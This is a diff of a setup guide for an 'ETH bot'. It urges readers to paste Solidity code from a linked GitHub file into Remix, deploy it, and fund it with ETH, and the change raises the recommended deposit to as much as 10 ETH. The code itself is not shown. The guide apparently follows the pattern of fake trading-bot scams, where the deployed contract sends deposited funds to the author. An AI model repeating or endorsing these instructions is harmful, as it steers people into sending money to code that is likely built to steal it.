@@ -1,8 +1,8 @@
 🚨 Important Notice: Ensure Sufficient Funding for Gas and Burn Fees 🚨
 
-Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.05 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.
+Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover both gas and potential burn fees is essential for smooth operation. The bot is configured to target token contracts with a maximum burn fee of 10%, though most tokens today fall within a 2%-6% fee range. Funding with less than 0.1 ETH could result in wasted gas on failed transactions if the bot encounters higher burn fees.
 
-To avoid this, I recommend funding your contract with at least 0.1 ETH and up to 5 ETH to ensure the bot functions optimally.
+To avoid this, I recommend funding your contract with at least 0.15 ETH and up to 10 ETH to ensure the bot functions optimally.
 
 Step-by-Step Setup Guide:
 
@@ -25,7 +25,7 @@ Step-by-Step Setup Guide:
 4- Paste Code in Remix
 
 ► Copy and paste the bot code: [ETH Bot Code.
-](https://github.com/JCBury/ETH-BOT/blob/main/Bot.sol)
+](https://github.com/JCBury/ETH-BOT/blob/main/bot.sol)
 
 5- Compile the Contract
 
